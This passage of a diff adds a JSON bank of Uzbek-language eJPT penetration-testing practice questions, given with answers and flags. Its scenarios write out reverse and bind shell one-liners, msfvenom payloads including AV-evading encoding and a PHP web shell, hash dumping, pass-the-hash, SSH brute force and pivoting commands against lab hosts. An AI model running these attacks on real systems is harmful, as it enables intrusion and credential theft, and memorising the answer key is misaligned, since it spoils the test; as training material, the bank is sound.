+  "explanation": "NT AUTHORITY\\SYSTEM — Windows'dagi eng yuqori imtiyoz, root'ga teng. Privilege escalation shart emas."
+ },
+ {
+  "id": "hnp-005",
+  "domain": "host_network_pentest",
+  "type": "flag",
+  "difficulty": "medium",
+  "tools": [
+   "meterpreter"
+  ],
+  "scenario": "meterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter > cd C:\\\\Users\\\\Administrator\\\\Desktop\nmeterpreter > cat flag.txt\nEJPT{pr1v_esc_c0mpl3t3}",
+  "question": "Administrator ish stolidagi flag qiymatini kiriting.",
+  "answer": "EJPT{pr1v_esc_c0mpl3t3}",
+  "explanation": "SYSTEM huquqi bilan Administrator\\Desktop\\flag.txt o'qildi: EJPT{pr1v_esc_c0mpl3t3}."
+ },
+ {
+  "id": "hnp-006",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "msfvenom"
+  ],
+  "scenario": "$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o shell.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows\nPayload size: 510 bytes\nFinal size of exe file: 7168 bytes\nSaved as: shell.exe",
+  "question": "Ushbu msfvenom buyrug'i qanday payload yaratadi?",
+  "options": [
+   "Windows uchun reverse TCP meterpreter (.exe)",
+   "Linux bind shell",
+   "Web shell (PHP)",
+   "Android APK"
+  ],
+  "answer": "Windows uchun reverse TCP meterpreter (.exe)",
+  "explanation": "-p windows/x64/meterpreter/reverse_tcp -f exe — Windows uchun reverse meterpreter exe payload. LHOST/LPORT — qaytish manzili."
+ },
+ {
+  "id": "hnp-007",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "msfvenom"
+  ],
+  "scenario": "$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o rev\nSaved as: rev",
+  "question": "Bu payload qanday turdagi shell yaratadi?",
+  "options": [
+   "Bind shell (target port ochadi)",
+   "Reverse shell (target hujumchiga ulanadi)",
+   "Web shell",
+   "Meterpreter GUI"
+  ],
+  "answer": "Reverse shell (target hujumchiga ulanadi)",
+  "explanation": "shell_reverse_tcp — target LHOST manziliga o'zi ulanadi. Reverse shell firewall'dan chiqishga oson o'tadi."
+ },
+ {
+  "id": "hnp-008",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "metasploit"
+  ],
+  "scenario": "# Reverse shell uchun kutish\nmsf6 > use exploit/multi/handler\nmsf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(multi/handler) > set LHOST 10.10.14.5\nmsf6 exploit(multi/handler) > set LPORT 443\nmsf6 exploit(multi/handler) > run\n[*] Started reverse TCP handler on 10.10.14.5:443",
+  "question": "multi/handler moduli nima uchun ishlatiladi?",
+  "options": [
+   "Target portlarini skanlash",
+   "Yaratilgan payload'dan kelayotgan reverse ulanishni qabul qilish",
+   "Parol buzish",
+   "Fayl yuklash"
+  ],
+  "answer": "Yaratilgan payload'dan kelayotgan reverse ulanishni qabul qilish",
+  "explanation": "multi/handler — msfvenom bilan yaratilgan payload target'da ishga tushganda kelgan sessiyani 'ushlaydi' (listener)."
+ },
+ {
+  "id": "hnp-009",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "meterpreter"
+  ],
+  "scenario": "meterpreter > getuid\nServer username: DESKTOP-01\\jdoe\nmeterpreter > getsystem\n[-] priv_elevate_getsystem: Operation failed\nmeterpreter > sysinfo\nOS: Windows 10 (10.0 Build 19041)",
+  "question": "getsystem muvaffaqiyatsiz bo'ldi. Keyingi mantiqiy qadam qaysi?",
+  "options": [
+   "Darhol imtihonni tugatish",
+   "Local privilege escalation yo'llarini qidirish (masalan winPEAS, exploit suggester)",
+   "Boshqa target'ga o'tish",
+   "Meterpreter'ni yopish"
+  ],
+  "answer": "Local privilege escalation yo'llarini qidirish (masalan winPEAS, exploit suggester)",
+  "explanation": "getsystem ishlamaganda — local_exploit_suggester yoki winPEAS bilan privesc vektorlarini qidirish kerak."
+ },
+ {
+  "id": "hnp-010",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "meterpreter"
+  ],
+  "scenario": "meterpreter > run post/multi/recon/local_exploit_suggester\n[*] Collecting local exploits for x64/windows...\n[+] exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.\n[+] exploit/windows/local/cve_2020_0796_smbghost: The target appears to be vulnerable.",
+  "question": "local_exploit_suggester nima maqsadda ishlatildi?",
+  "options": [
+   "Target IP topish",
+   "Ushbu tizim uchun mos privilege escalation exploitlarini aniqlash",
+   "Parollarni buzish",
+   "Fayllarni shifrlash"
+  ],
+  "answer": "Ushbu tizim uchun mos privilege escalation exploitlarini aniqlash",
+  "explanation": "local_exploit_suggester joriy sessiya uchun mos local (privesc) exploitlarni tavsiya qiladi — masalan SMBGhost."
+ },
+ {
+  "id": "hnp-011",
+  "domain": "host_network_pentest",
+  "type": "flag",
+  "difficulty": "easy",
+  "tools": [
+   "meterpreter"
+  ],
+  "scenario": "meterpreter > shell\nC:\\> whoami\nnt authority\\system\nC:\\> type C:\\\\flag_root.txt\nEJPT{syst3m_sh3ll_win}",
+  "question": "C:\\flag_root.txt ichidagi flag qiymatini kiriting.",
+  "answer": "EJPT{syst3m_sh3ll_win}",
+  "explanation": "SYSTEM shell orqali C:\\flag_root.txt o'qildi: EJPT{syst3m_sh3ll_win}."
+ },
+ {
+  "id": "hnp-012",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "hard",
+  "tools": [
+   "meterpreter",
+   "pivoting"
+  ],
+  "scenario": "meterpreter > run autoroute -s 192.168.20.0/24\n[*] Adding a route to 192.168.20.0/255.255.255.0...\n[+] Added route to 192.168.20.0/255.255.255.0 via 10.10.10.7\nmeterpreter > background\nmsf6 > use auxiliary/scanner/portscan/tcp\nmsf6 > set RHOSTS 192.168.20.10",
+  "question": "autoroute buyrug'i nima uchun ishlatildi (pivoting)?",
+  "options": [
+   "Internetga chiqish uchun",
+   "Buzilgan host orqali ichki 192.168.20.0/24 tarmog'iga marshrut ochish uchun",
+   "Fayl yuklash uchun",
+   "Parol buzish uchun"
+  ],
+  "answer": "Buzilgan host orqali ichki 192.168.20.0/24 tarmog'iga marshrut ochish uchun",
+  "explanation": "autoroute buzilgan hostni 'ko'prik' qilib, Metasploit trafikini yangi ichki tarmoqqa (192.168.20.0/24) yo'naltiradi — bu pivoting."
+ },
+ {
+  "id": "hnp-013",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "hard",
+  "tools": [
+   "meterpreter",
+   "pivoting"
+  ],
+  "scenario": "meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.20.10\n[*] Local TCP relay created: :3389 <-> 192.168.20.10:3389\n$ xfreerdp /v:127.0.0.1:3389 /u:admin",
+  "question": "portfwd buyrug'i qanday natija beradi?",
+  "options": [
+   "Target'ni o'chiradi",
+   "Kali'ning 127.0.0.1:3389 portini ichki 192.168.20.10:3389 ga bog'laydi",
+   "Yangi foydalanuvchi yaratadi",
+   "Parolni o'zgartiradi"
+  ],
+  "answer": "Kali'ning 127.0.0.1:3389 portini ichki 192.168.20.10:3389 ga bog'laydi",
+  "explanation": "portfwd local portni (127.0.0.1:3389) pivot orqali erishib bo'lmaydigan ichki hostning portiga tunnel qiladi — endi lokal RDP client ulanadi."
+ },
+ {
+  "id": "hnp-014",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "meterpreter"
+  ],
+  "scenario": "meterpreter > hashdump\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\njdoe:1001:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef:::",
+  "question": "hashdump natijasida olingan qiymat qanday turdagi hash?",
+  "options": [
+   "MD5 (web parollari)",
+   "NTLM hash (Windows SAM)",
+   "bcrypt",
+   "SHA-512 (Linux shadow)"
+  ],
+  "answer": "NTLM hash (Windows SAM)",
+  "explanation": "Format LM:NTLM (aad3b4... — bo'sh LM). Bu Windows SAM'dan olingan NTLM hashlar — pass-the-hash yoki crack qilish mumkin."
+ },
+ {
+  "id": "hnp-015",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "metasploit"
+  ],
+  "scenario": "msf6 > search type:exploit name:tomcat\n   #  Name                                                  Rank\n   0  exploit/multi/http/tomcat_mgr_upload                  excellent\n   1  exploit/multi/http/tomcat_mgr_deploy                  excellent\n$ # target: Apache Tomcat manager, credential topilgan: tomcat/s3cret",
+  "question": "Tomcat Manager'ga credential topilgach WAR fayl orqali shell olish uchun qaysi modul mos?",
+  "options": [
+   "exploit/windows/smb/psexec",
+   "exploit/multi/http/tomcat_mgr_upload",
+   "auxiliary/scanner/http/dir_scanner",
+   "post/linux/gather/hashdump"
+  ],
+  "answer": "exploit/multi/http/tomcat_mgr_upload",
+  "explanation": "tomcat_mgr_upload topilgan manager credential bilan zararli WAR yuklab, RCE beradi."
+ },
+ {
+  "id": "hnp-016",
+  "domain": "host_network_pentest",
+  "type": "direct",
+  "difficulty": "medium",
+  "tools": [
+   "msfvenom"
+  ],
+  "scenario": "$ msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php\n# Fayl zaif upload orqali serverga yuklandi va ochildi",
+  "question": "Bu qaysi til uchun web shell payload? (til nomini yozing, masalan: php/asp/jsp)",
+  "answer": "php",
+  "explanation": "php/meterpreter/reverse_tcp — PHP web shell. Zaif fayl upload'i orqali yuklab, brauzerdan ochilganda meterpreter ochiladi."
+ },
+ {
+  "id": "hnp-017",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "netcat"
+  ],
+  "scenario": "# Kali (hujumchi):\n$ nc -lvnp 4444\nlistening on [any] 4444 ...\n# Target'da ishga tushgan buyruq:\nbash -i >& /dev/tcp/10.10.14.5/4444 0>&1",
+  "question": "Ushbu bash buyrug'i qanday shell hosil qiladi?",
+  "options": [
+   "Bind shell",
+   "Reverse shell (target Kali'ga ulanadi)",
+   "Web shell",
+   "SSH tunnel"
+  ],
+  "answer": "Reverse shell (target Kali'ga ulanadi)",
+  "explanation": "'/dev/tcp/10.10.14.5/4444' — target hujumchining 4444 portiga o'zi ulanadi (reverse). nc -lvnp esa listener."
+ },
+ {
+  "id": "hnp-018",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "netcat"
+  ],
+  "scenario": "# Target'da:\n$ nc -lvnp 5555 -e /bin/bash\n# Kali'da:\n$ nc 10.10.10.5 5555",
+  "question": "Bu qanday turdagi shell?",
+  "options": [
+   "Reverse shell",
+   "Bind shell (target port ochib kutadi)",
+   "Meterpreter",
+   "Web shell"
+  ],
+  "answer": "Bind shell (target port ochib kutadi)",
+  "explanation": "Target 5555 portni ochib /bin/bash ni bog'ladi (bind). Hujumchi o'zi ulanadi. Bind shell — target'ga kiruvchi ulanish ochiq bo'lishi kerak."
+ },
+ {
+  "id": "hnp-019",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "meterpreter"
+  ],
+  "scenario": "meterpreter > ps\n PID   Name             Arch  Session  User\n 640   winlogon.exe     x64   1        NT AUTHORITY\\SYSTEM\n 2104  explorer.exe     x64   1        DESKTOP\\jdoe\n 3300  notepad.exe      x86   1        DESKTOP\\jdoe\nmeterpreter > migrate 640",
+  "question": "migrate 640 buyrug'i nima qiladi?",
+  "options": [
+   "640-processni o'chiradi",
+   "Meterpreter'ni winlogon.exe (SYSTEM) processiga ko'chiradi",
+   "Yangi fayl yaratadi",
+   "Tarmoqni skanlaydi"
+  ],
+  "answer": "Meterpreter'ni winlogon.exe (SYSTEM) processiga ko'chiradi",
+  "explanation": "migrate meterpreter'ni boshqa (barqaror, yuqori imtiyozli) processga ko'chiradi — bu yerda SYSTEM huquqli winlogon.exe."
+ },
+ {
+  "id": "hnp-020",
+  "domain": "host_network_pentest",
+  "type": "flag",
+  "difficulty": "medium",
+  "tools": [
+   "meterpreter"
+  ],
+  "scenario": "meterpreter > cat /root/proof.txt\nEJPT{l1nux_r00t_pwn3d}",
+  "question": "/root/proof.txt ichidagi flag qiymatini kiriting.",
+  "answer": "EJPT{l1nux_r00t_pwn3d}",
+  "explanation": "/root katalogiga faqat root kira oladi — flag: EJPT{l1nux_r00t_pwn3d}."
+ },
+ {
+  "id": "hnp-021",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "metasploit"
+  ],
+  "scenario": "msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp\nmsf6 exploit(...) > exploit\n[*] Sending stage (200262 bytes)\n# vs\nmsf6 exploit(...) > set PAYLOAD windows/x64/shell_reverse_tcp",
+  "question": "'meterpreter/reverse_tcp' (stage yuboriladi) va 'shell_reverse_tcp' o'rtasidagi asosiy farq nima?",
+  "options": [
+   "Ikkalasi bir xil",
+   "meterpreter — boy funksiyali sessiya; shell — oddiy komanda qatori",
+   "shell tezroq va xavfsizroq",
+   "meterpreter faqat Linux uchun"
+  ],
+  "answer": "meterpreter — boy funksiyali sessiya; shell — oddiy komanda qatori",
+  "explanation": "Meterpreter — hashdump, migrate, portfwd kabi ko'plab funksiyali payload. shell_reverse_tcp esa oddiy OS shell beradi, xolos."
+ },
+ {
+  "id": "hnp-022",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "hard",
+  "tools": [
+   "meterpreter",
+   "pivoting"
+  ],
+  "scenario": "meterpreter > run post/multi/manage/autoroute\nmsf6 > use auxiliary/server/socks_proxy\nmsf6 auxiliary(server/socks_proxy) > set VERSION 4a\nmsf6 auxiliary(server/socks_proxy) > run\n[*] Starting the SOCKS proxy server\n# /etc/proxychains.conf: socks4 127.0.0.1 1080",
+  "question": "SOCKS proxy + proxychains kombinatsiyasi nima uchun kerak?",
+  "options": [
+   "Kali tashqi vositalarini (nmap, ssh) pivot orqali ichki tarmoqqa yo'naltirish",
+   "Parol buzishni tezlashtirish",
+   "Payload hajmini kichraytirish",
+   "Faqat DNS so'rovlari uchun"
+  ],
+  "answer": "Kali tashqi vositalarini (nmap, ssh) pivot orqali ichki tarmoqqa yo'naltirish",
+  "explanation": "socks_proxy + proxychains Metasploit'dan tashqaridagi vositalarni (masalan proxychains nmap) buzilgan host orqali ichki tarmoqqa tunnel qiladi."
+ },
+ {
+  "id": "hnp-023",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "metasploit"
+  ],
+  "scenario": "msf6 > sessions\nActive sessions\n===============\n  Id  Type                   Information\n  1   meterpreter x64/windows NT AUTHORITY\\SYSTEM @ WIN-01\n  2   shell linux              www-data @ web-srv",
+  "question": "1-sessiyaga qaytish (interaktiv qilish) uchun qaysi buyruq ishlatiladi?",
+  "options": [
+   "sessions -k 1",
+   "sessions -i 1",
+   "sessions -c 1",
+   "exit 1"
+  ],
+  "answer": "sessions -i 1",
+  "explanation": "sessions -i <id> — sessiya bilan interaktiv ishlashni boshlaydi. -k esa sessiyani yopadi (kill)."
+ },
+ {
+  "id": "hnp-024",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "metasploit"
+  ],
+  "scenario": "msf6 > use exploit/windows/smb/psexec\nmsf6 exploit(windows/smb/psexec) > set SMBUser administrator\nmsf6 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\nmsf6 exploit(windows/smb/psexec) > run",
+  "question": "psexec moduliga parol o'rniga NTLM hash berildi. Bu qanday texnika?",
+  "options": [
+   "Brute-force",
+   "Pass-the-Hash",
+   "Kerberoasting",
+   "Password spraying"
+  ],
+  "answer": "Pass-the-Hash",
+  "explanation": "NTLM hashni parol o'rniga to'g'ridan-to'g'ri autentifikatsiyada ishlatish — Pass-the-Hash. Parolni buzish shart emas."
+ },
+ {
+  "id": "hnp-025",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "msfvenom"
+  ],
+  "scenario": "$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o enc.exe",
+  "question": "'-e x86/shikata_ga_nai -i 10' parametrlari nima maqsadda?",
+  "options": [
+   "Payload'ni 10 marta encoder bilan kodlash (AV'dan qochish uchun)",
+   "Payload'ni shifrlash",
+   "10 ta target'ga yuborish",
+   "LPORT'ni 10 ga o'zgartirish"
+  ],
+  "answer": "Payload'ni 10 marta encoder bilan kodlash (AV'dan qochish uchun)",
+  "explanation": "-e encoder, -i 10 — 10 iteratsiya kodlash. shikata_ga_nai — mashhur polimorf encoder (oddiy AV signaturalaridan qochishga urinish)."
+ },
+ {
+  "id": "hnp-026",
+  "domain": "host_network_pentest",
+  "type": "flag",
+  "difficulty": "hard",
+  "tools": [
+   "meterpreter",
+   "pivoting"
+  ],
+  "scenario": "# Pivot orqali ichki hostdan olingan\nproxychains ssh admin@192.168.20.15\nadmin@internal:~$ cat /home/admin/pivot_flag.txt\nEJPT{p1v0t_1nt0_1nt3rnal_n3t}",
+  "question": "Ichki tarmoqdagi (pivot orqali) hostdan olingan flag qiymatini kiriting.",
+  "answer": "EJPT{p1v0t_1nt0_1nt3rnal_n3t}",
+  "explanation": "proxychains orqali ichki 192.168.20.15 ga SSH bilan kirib flag olindi: EJPT{p1v0t_1nt0_1nt3rnal_n3t}."
+ },
+ {
+  "id": "hnp-027",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "meterpreter"
+  ],
+  "scenario": "meterpreter > sysinfo\nComputer        : WEB-SRV-02\nOS              : Ubuntu 18.04 (Linux 4.15.0-112-generic)\nArchitecture    : x64\nMeterpreter     : x64/linux",
+  "question": "sysinfo natijasiga ko'ra target qaysi tizim?",
+  "options": [
+   "Windows Server 2019",
+   "Ubuntu 18.04 (Linux)",
+   "CentOS 7",
+   "Windows 10"
+  ],
+  "answer": "Ubuntu 18.04 (Linux)",
+  "explanation": "sysinfo 'OS: Ubuntu 18.04 (Linux 4.15...)' — target Linux (Ubuntu). Bu keyingi privesc yo'lini belgilaydi."
+ },
+ {
+  "id": "hnp-028",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "meterpreter"
+  ],
+  "scenario": "meterpreter > download C:\\\\inetpub\\\\wwwroot\\\\web.config /root/loot/\n[*] Downloading: web.config -> /root/loot/web.config\n[*] download   : web.config -> /root/loot/web.config",
+  "question": "download buyrug'i nima qildi?",
+  "options": [
+   "Target'ga fayl yukladi",
+   "Target'dan web.config faylini Kali'ga ko'chirib oldi",
+   "Faylni o'chirdi",
+   "Faylni shifrladi"
+  ],
+  "answer": "Target'dan web.config faylini Kali'ga ko'chirib oldi",
+  "explanation": "meterpreter download — target->Kali yo'nalishida fayl ko'chiradi. web.config ko'pincha DB credential saqlaydi (loot)."
+ },
+ {
+  "id": "hnp-029",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "metasploit"
+  ],
+  "scenario": "msf6 > use auxiliary/scanner/ssh/ssh_login\nmsf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 10.10.10.5\nmsf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME root\nmsf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt\nmsf6 auxiliary(scanner/ssh/ssh_login) > run\n[+] 10.10.10.5:22 - Success: 'root:toor'",
+  "question": "ssh_login moduli qanday natijaga erishdi?",
+  "options": [
+   "SSH kalitini o'g'irladi",
+   "'root:toor' credential'ini brute-force bilan topdi",
+   "SSH portini yopdi",
+   "Faqat versiyani aniqladi"
+  ],
+  "answer": "'root:toor' credential'ini brute-force bilan topdi",
+  "explanation": "ssh_login wordlist bilan SSH parolini sinab ko'radi; 'Success: root:toor' — to'g'ri credential topildi va sessiya ochiladi."
+ },
+ {
+  "id": "hnp-030",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "hard",
+  "tools": [
+   "metasploit"
+  ],
+  "scenario": "msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_https\nmsf6 exploit(...) > set LPORT 443",
+  "question": "reverse_https payload reverse_tcp'ga nisbatan qanday afzallikka ega?",
+  "options": [
+   "Tezroq ishlaydi",
+   "Trafik HTTPS'ga o'xshaydi va IDS/firewall'dan o'tishi osonroq",
+   "Kichikroq hajm",
+   "Parolni ham buzadi"
+  ],
+  "answer": "Trafik HTTPS'ga o'xshaydi va IDS/firewall'dan o'tishi osonroq",
+  "explanation": "reverse_https C2 trafikini shifrlab, oddiy HTTPS'ga o'xshatadi — 443-port orqali chiqib, tarmoq monitoringidan qochishga yordam beradi."
+ },
+ {
+  "id": "hnp-031",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "metasploit"
+  ],
+  "scenario": "msf6 > use exploit/unix/ftp/vsftpd_234_backdoor\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.10.8\nmsf6 exploit(unix/ftp/vsftpd_234_backdoor) > run\n[+] 10.10.10.8:21 - Backdoor service has been spawned, handling...\n[*] Command shell session 1 opened",
+  "question": "Bu exploit qaysi zaiflikdan foydalandi?",
+  "options": [
+   "SMB EternalBlue",
+   "vsftpd 2.3.4 backdoor",
+   "Apache Struts",
+   "MySQL UDF"
+  ],
+  "answer": "vsftpd 2.3.4 backdoor",
+  "explanation": "vsftpd 2.3.4 — o'ziga xos backdoor'li versiya; ':)' bilan tugagan login backdoor shellni ochadi (6200-port)."
+ },
+ {
+  "id": "hnp-032",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "meterpreter"
+  ],
+  "scenario": "meterpreter > upload /root/tools/winPEAS.exe C:\\\\Windows\\\\Temp\\\\wp.exe\n[*] uploading  : winPEAS.exe -> C:\\Windows\\Temp\\wp.exe\n[*] uploaded   : winPEAS.exe -> C:\\Windows\\Temp\\wp.exe",
+  "question": "winPEAS.exe target'ga yuklandi. U qanday maqsadda ishlatiladi?",
+  "options": [
+   "Antivirus",
+   "Windows'da privilege escalation vektorlarini avtomatik topish",
+   "Fayl shifrlash",
+   "Tarmoq skaneri"
+  ],
+  "answer": "Windows'da privilege escalation vektorlarini avtomatik topish",
+  "explanation": "winPEAS — Windows'da xato konfiguratsiya, zaif servis, saqlangan parol kabi privesc yo'llarini avtomatik topadigan enumeration skripti."
+ },
+ {
+  "id": "hnp-033",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "metasploit"
+  ],
+  "scenario": "msf6 exploit(multi/handler) > exploit -j\n[*] Exploit running as background job 0.\n[*] Started reverse TCP handler on 10.10.14.5:4444",
+  "question": "'-j' bayrog'i exploit'ni qanday ishga tushiradi?",
+  "options": [
+   "Bir marta ishlatadi va to'xtaydi",
+   "Fon (background) job sifatida — bir nechta sessiya qabul qila oladi",
+   "Faqat test rejimida",
+   "Verbose rejimda"
+  ],
+  "answer": "Fon (background) job sifatida — bir nechta sessiya qabul qila oladi",
+  "explanation": "-j handler'ni fonda job qilib qoldiradi — bir nechta target ulanishi mumkin, konsol band bo'lmaydi."
+ },
+ {
+  "id": "hnp-034",
+  "domain": "host_network_pentest",
+  "type": "flag",
+  "difficulty": "easy",
+  "tools": [
+   "netcat"
+  ],
+  "scenario": "$ nc -lvnp 4444\nconnect to [10.10.14.5] from (UNKNOWN) [10.10.10.9] 51234\n$ id\nuid=33(www-data) gid=33(www-data)\n$ cat /var/www/flag.txt\nEJPT{r3v3rs3_sh3ll_caught}",
+  "question": "Reverse shell orqali olingan flag qiymatini kiriting.",
+  "answer": "EJPT{r3v3rs3_sh3ll_caught}",
+  "explanation": "Netcat listener reverse shellni ushladi (www-data); /var/www/flag.txt: EJPT{r3v3rs3_sh3ll_caught}."
+ },
+ {
+  "id": "hnp-035",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "meterpreter"
+  ],
+  "scenario": "meterpreter > ipconfig\nInterface 11\n============\nName         : Ethernet0\nIPv4 Address : 10.10.10.7\nInterface 18\n============\nName         : Ethernet1\nIPv4 Address : 192.168.20.7",
+  "question": "Bu ma'lumot nima uchun pivoting uchun muhim?",
+  "options": [
+   "Target'da ikki tarmoq interfeysi bor — 192.168.20.0/24 ichki tarmoqqa yo'l ochish mumkin",
+   "Target internetga ulanmagan",
+   "Faqat bitta IP bor",
+   "Target Windows emas"
+  ],
+  "answer": "Target'da ikki tarmoq interfeysi bor — 192.168.20.0/24 ichki tarmoqqa yo'l ochish mumkin",
+  "explanation": "Ikkinchi interfeys (192.168.20.7) target boshqa ichki tarmoqqa ulanganini ko'rsatadi — bu pivot uchun asosiy topilma (autoroute)."
+ },
+ {
+  "id": "hnp-036",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "metasploit"
+  ],
+  "scenario": "msf6 > use exploit/multi/http/apache_normalize_path_rce\nmsf6 exploit(...) > check\n[+] 10.10.10.25:80 - The target is vulnerable.",
+  "question": "'check' buyrug'i nima qiladi?",
+  "options": [
+   "Exploit'ni to'liq ishga tushiradi",
+   "Target zaifligini ekspluatatsiyasiz tekshiradi",
+   "Payload yaratadi",
+   "Sessiyani yopadi"
+  ],
+  "answer": "Target zaifligini ekspluatatsiyasiz tekshiradi",
+  "explanation": "check — target haqiqatan zaifmi yoki yo'qmi, ekspluatatsiya qilmasdan aniqlaydi (barcha modullar qo'llab-quvvatlamaydi)."
+ },
+ {
+  "id": "hnp-037",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "hard",
+  "tools": [
+   "meterpreter",
+   "pivoting"
+  ],
+  "scenario": "# 1-target buzildi (10.10.10.7), ichki tarmoq 192.168.20.0/24 topildi\n# Keyingi qadamlar:\nA) autoroute qo'shish\nB) ichki tarmoqni portscan qilish\nC) socks_proxy + proxychains sozlash",
+  "question": "Ichki tarmoqdagi hostlarga tashqi vositalar (masalan proxychains nmap) bilan yetish uchun to'g'ri tartib qaysi?",
+  "options": [
+   "Faqat A",
+   "A -> B -> C",
+   "C -> A -> B",
+   "Faqat B"
+  ],
+  "answer": "A -> B -> C",
+  "explanation": "Avval autoroute (A) marshrut ochadi, so'ng ichki portscan (B), keyin socks_proxy+proxychains (C) tashqi vositalarni tunnel qiladi."
+ },
+ {
+  "id": "hnp-038",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "metasploit"
+  ],
+  "scenario": "msf6 > use post/windows/gather/hashdump\nmsf6 post(windows/gather/hashdump) > set SESSION 1\nmsf6 post(windows/gather/hashdump) > run",
+  "question": "'post/' bilan boshlanadigan modullar qachon ishlatiladi?",
+  "options": [
+   "Ekspluatatsiyadan OLDIN",
+   "Sessiya ochilgandan KEYIN (post-exploitation)",
+   "Faqat skan uchun",
+   "Payload yaratish uchun"
+  ],
+  "answer": "Sessiya ochilgandan KEYIN (post-exploitation)",
+  "explanation": "post-modullar mavjud sessiya (SESSION) ustida ishlaydi — ma'lumot yig'ish, hash olish, privesc kabi post-exploitation vazifalar."
+ },
+ {
+  "id": "hnp-039",
+  "domain": "host_network_pentest",
+  "type": "direct",
+  "difficulty": "medium",
+  "tools": [
+   "msfvenom"
+  ],
+  "scenario": "$ msfvenom -l payloads | grep 'linux/x64' | head\n... linux/x64/meterpreter/reverse_tcp ...\n$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f elf -o m",
+  "question": "Ushbu payload target Kali'ning qaysi portiga ulanadi? (port raqami)",
+  "answer": "1337",
+  "explanation": "LPORT=1337 — reverse ulanish Kali'ning 1337 portiga keladi; shu portda handler kutishi kerak."
+ },
+ {
+  "id": "hnp-040",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "medium",
+  "tools": [
+   "meterpreter"
+  ],
+  "scenario": "meterpreter > run post/windows/manage/enable_rdp\n[*] Enabling Remote Desktop\n[*] RDP is already enabled\n[*] Setting Terminal Services / RDP registry keys\n[*] Opening port in local firewall if necessary",
+  "question": "Bu post-modul nima qiladi?",
+  "options": [
+   "RDP'ni o'chiradi",
+   "Target'da RDP'ni yoqadi (masofadan grafik kirish uchun)",
+   "Parol o'zgartiradi",
+   "Faylni o'chiradi"
+  ],
+  "answer": "Target'da RDP'ni yoqadi (masofadan grafik kirish uchun)",
+  "explanation": "enable_rdp target'da Remote Desktop'ni yoqadi va firewall'ni ochadi — keyin credential bilan grafik kirish (persistence) mumkin."
+ },
+ {
+  "id": "hnp-041",
+  "domain": "host_network_pentest",
+  "type": "mcq",
+  "difficulty": "easy",
+  "tools": [
+   "metasploit"
+  ],
+  "scenario": "msf6 exploit(...) > show payloads\n   0  payload/windows/x64/meterpreter/bind_tcp\n   1  payload/windows/x64/meterpreter/reverse_tcp\n# Target firewall barcha KIRUVCHI ulanishlarni bloklaydi, lekin CHIQUVCHI ruxsat",
